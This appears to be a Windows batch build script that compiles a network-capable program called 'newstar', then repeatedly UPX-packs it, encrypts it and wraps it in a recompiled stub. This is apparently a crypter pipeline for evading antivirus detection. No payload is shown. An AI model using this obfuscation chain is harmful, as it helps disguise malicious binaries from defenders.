@gcc -s newstar.c -o newstar.exe -lws2_32 -lMpr -lRpcrt4 -lwininet
%~dp0\Post\upx.exe -9 newstar.exe
%~dp0\Post\crypt.exe newstar.exe
%~dp0\Post\read.exe newstar.exe > newstar_enc.c
@gcc -s newstar_enc.c -o newstar_enc.exe
@del /f /s /q newstar.exe
@del /f /s /q newstar_enc.c
@ren newstar_enc.exe newstar.exe
%~dp0\Post\upx.exe -9 newstar.exe
@echo Finished!